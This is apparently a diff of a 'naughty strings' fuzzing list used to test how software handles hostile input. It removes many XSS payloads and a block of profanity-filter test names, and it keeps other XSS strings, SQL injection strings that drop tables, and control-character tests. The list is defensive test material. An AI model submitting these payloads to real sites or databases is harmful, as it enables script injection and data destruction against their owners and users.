@@ -200,63 +200,6 @@ ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
 ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
 ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
 ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
-<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
 `"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
 `"'><img src=xxx:x \x22onerror=javascript:alert(1)>
 `"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
@@ -338,13 +281,9 @@ ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
 <img src=x onerror=\x12"javascript:alert(1)">
 <img src=x onerror=\x32"javascript:alert(1)">
 <img src=x onerror=\x00"javascript:alert(1)">
-<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
 <img src="x` `<script>javascript:alert(1)</script>"` `>
 <img src onerror /" '"= alt=javascript:alert(1)//">
 <title onpropertychange=javascript:alert(1)></title><title title=>
-<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
-<!--[if]><script>javascript:alert(1)</script -->
-<!--[if<img src=x onerror=javascript:alert(1)//]> -->
 <script src="/\%(jscript)s"></script>
 <script src="\\%(jscript)s"></script>
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
@@ -373,7 +312,6 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 <u oncopy=alert()> Copy me</u>
 <i onwheel=alert(1)> Scroll over me </i>
 <plaintext>
-http://a/%%30%30
 </textarea><script>alert(123)</script>
 1;DROP TABLE users
 1'; DROP TABLE users-- 1
@@ -425,27 +363,6 @@ COM2
 COM3
 COM4
 DCC SEND STARTKEYLOGGER 0 0 0
-Scunthorpe General Hospital
-Penistone Community Church
-Lightwater Country Park
-Jimmy Clitheroe
-Horniman Museum
-shitake mushrooms
-RomansInSussex.co.uk
-http://www.cum.qc.ca/
-Craig Cockburn, Software Specialist
-Linda Callahan
-Dr. Herman I. Libshitz
-magna cum laude
-Super Bowl XXX
-medieval erection of parapets
-evaluate
-mocha
-expression
-Arsenal canal
-classic
-Tyson Gay
-Dick Van Dyke
-basement
+
 If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.
 Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue
